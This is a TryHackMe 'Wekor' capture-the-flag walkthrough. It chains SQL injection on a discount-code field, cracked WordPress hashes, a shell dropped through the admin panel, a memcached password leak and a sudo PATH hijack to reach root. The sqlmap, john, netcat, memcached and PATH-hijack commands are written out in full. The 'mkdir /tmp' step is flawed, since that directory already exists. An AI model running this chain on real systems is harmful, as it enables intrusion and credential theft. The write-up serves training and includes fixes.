@@ -1,0 +1,193 @@
+---
+title: 'Wekor'
+description: 'A hidden WordPress subdomain falls to SQL injection and a cracked admin password, then an exposed memcached service and a PATH hijack chain all the way to root.'
+date: 2025-12-01
+platform: tryhackme
+room: 'Wekor'
+roomUrl: 'https://tryhackme.com/room/wekorra'
+difficulty: medium
+tags:
+  - 'web'
+  - 'sql-injection'
+  - 'wordpress'
+  - 'password-cracking'
+  - 'memcached'
+  - 'linux'
+  - 'privesc'
+vulnClasses:
+  - 'sql injection'
+  - 'weak credentials'
+  - 'authenticated remote code execution'
+  - 'insecure privileged service'
+  - 'insecure command execution'
+translation: done
+draft: false
+---
+
+## **TryHackMe: Wekor — SQL Injection, a Cracked WordPress Login, and a Memcached Leak to Root**
+
+_A walkthrough of the "Wekor" TryHackMe room. A SQL injection in an e-commerce discount-code parameter dumps the WordPress database, a cracked admin password gets us a shell, and an internal memcached instance leaks a second user's password in the clear — who turns out to hold a sudo rule we can abuse with a classic PATH hijack._
+
+> The flags are redacted. Wekor is an authorized training room on TryHackMe; everything here was performed against a legal practice target. Values shown as `<redacted>` are real on the box but withheld here.
+
+---
+
+### **TL;DR**
+
+<Callout type="tldr">
+
+A **SQL injection** in the shop's discount-code request dumps the `wordpress` database's `wp_users` table → cracking the phpass hashes with `john` recovers `wp_yura`'s password → logging into **wp-admin** with full privileges lets us drop a **PHP reverse shell through the admin panel** → as `www-data` we find an **internal-only memcached** instance leaking the `Orka` user's password in plaintext → `su Orka` → a `sudo`-able custom `bitcoin` binary calls `python` by bare name instead of an absolute path → **PATH hijack** → root.
+
+SQLi → cracked creds → admin RCE → memcached leak → PATH hijack → root.
+
+</Callout>
+
+### **The target**
+
+```text
+export IP=<target-ip>
+```
+
+Wekor exposes SSH (22) and an Apache site on 80. The main vhost (`wekor.thm`) is an e-commerce "shop" front end; a second vhost, discovered by fuzzing, serves a WordPress install under `/wordpress`.
+
+### **The vulnerability: an unauthenticated discount-code parameter reaches SQL**
+
+Adding an item to the cart and applying a discount code sends a POST request whose parameter is concatenated straight into the backend query — no parameterization, no escaping.
+
+<Callout type="insight">
+
+The site's own search and contact forms turn up nothing, but the **discount-code** flow does — running the captured request through `sqlmap` confirms the parameter is injectable, and the database behind it isn't limited to the shop: it's the same MySQL instance backing the site's **WordPress** install.
+
+</Callout>
+
+### **Step 1 — recon and virtual-host discovery**
+
+```text
+rustscan -t 1500 -a wekor.thm --ulimit=5000 -- -A -sC -sV
+# 22/tcp open ssh   OpenSSH 7.2p2
+# 80/tcp open http  Apache 2.4.18, robots.txt discloses /workshop /agent /crawler ...
+```
+
+Fuzzing the `Host` header turns up a second vhost:
+
+```text
+ffuf -H "Host: FUZZ.wekor.thm" -u http://wekor.thm -w subdomains-top1million-5000.txt -fs 23
+# site.wekor.thm  [Status: 200]
+```
+
+Directory brute-forcing `site.wekor.thm` then finds a WordPress install:
+
+```text
+ffuf -u http://site.wekor.thm/FUZZ -w directory-list-2.3-medium.txt -fc 404
+# wordpress  [Status: 301]
+```
+
+### **Step 2 — SQL injection dumps the WordPress users table**
+
+With the discount-code request saved to `request.txt`:
+
+```text
+sqlmap -r request.txt -D wordpress -T wp_users -C user_login,user_pass --dump
+# user_login: admin, wp_eagle, wp_jeffrey, wp_yura
+# user_pass:  phpass ($P$...) hashes, one per account
+```
+
+### **Step 3 — cracking the phpass hashes**
+
+```text
+john --format=phpass --wordlist=rockyou.txt hashlist.txt
+# 3 of 4 hashes crack; wp_yura -> <redacted-wp-password>
+```
+
+`wp_yura` turns out to hold full administrator privileges in the WordPress dashboard — the account worth having.
+
+### **Step 4 — authenticated RCE through the WordPress admin panel**
+
+Logging in as `wp_yura` with maximum dashboard privileges gives us everything needed to execute code: the admin panel lets an administrator edit theme/plugin files directly, so a small PHP web-shell dropped through that panel and requested back over HTTP gives us a shell.
+
+```text
+nc -lvnp 4444
+# connect from $IP → uid=33(www-data) gid=33(www-data)
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+```
+
+### **Step 5 — an internal memcached instance leaks a plaintext password**
+
+Nothing useful sits in `/home` for `www-data`, so the next move is checking what's only listening on loopback:
+
+```text
+netstat -tulpn
+# 127.0.0.1:3010   (internal app)
+# 127.0.0.1:3306   mysql
+# 127.0.0.1:11211  memcached   <-- unauthenticated, loopback-only
+```
+
+Memcached has no authentication by default. Dumping its keys hands over a full credential pair:
+
+```text
+telnet 127.0.0.1 11211
+stats cachedump 1 0
+get username   # -> Orka
+get password   # -> <redacted-orka-password>
+```
+
+```text
+su Orka
+cat user.txt   # -> <redacted-flag>
+```
+
+### **Step 6 — PATH hijack through a sudo-able custom binary**
+
+```text
+sudo -l
+# (root) /home/Orka/Desktop/bitcoin
+```
+
+The `bitcoin` binary gates execution behind a password prompt. Pulling the binary down and opening it in Ghidra recovers the real password, after which the program runs a helper step that calls `python` **by bare name** rather than an absolute path:
+
+```text
+mkdir /tmp && cd /tmp
+cat > python <<'EOF'
+#!/bin/bash
+/bin/bash
+EOF
+chmod +x python
+export PATH=/tmp:$PATH
+sudo /home/Orka/Desktop/bitcoin
+# Enter the password: <redacted-cracked-binary-password>
+# Access Granted... -> our fake "python" in /tmp runs as root instead
+```
+
+```text
+cat /root/root.txt   # -> <redacted-flag>
+```
+
+### **Impact**
+
+<Callout type="critical">
+
+**High — CVSS 3.1 8.8** (`AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`). The full chain is local-to-root with no exotic requirements, starting from an unauthenticated SQL injection reachable from a routine shop checkout flow:
+
+- **SQL injection exposes every WordPress credential** on the box.
+- **An internal memcached instance with zero authentication** hands over a second user's password in plaintext to any process on the host.
+- **A sudo binary that resolves helper commands by bare name** turns a password-gated utility into unrestricted root execution for anyone who controls `$PATH`.
+
+</Callout>
+
+### **Recommended fix**
+
+<Callout type="fix">
+
+1. **Parameterize the discount-code query.** Never concatenate request parameters into SQL; use prepared statements and least-privilege DB accounts.
+2. **Bind memcached to loopback with authentication enabled** (SASL), and never store plaintext credentials in a cache layer regardless of exposure.
+3. **Use absolute paths in any script a** **`sudo`\*\***-able binary invokes\*\*, and set `secure_path` so `sudo`'s PATH can't be influenced by the calling user.
+
+</Callout>
+
+### **Takeaways**
+
+- **A "minor" feature (a discount code) is still an injection point.** Treat every parameter that reaches a query the same, regardless of how small the feature looks.
+- **Memcached has no auth by default** — if it's reachable at all, treat whatever it stores as already leaked.
+- **PATH hijacking is still common in** **`sudo`** **wrappers.** Any script invoked by root that doesn't use absolute paths for the binaries it calls is a privilege-escalation primitive waiting to be used.
+
+Thanks for reading. Wekor is a good reminder that the smallest-looking form on a page is often the one nobody bothered to parameterize.
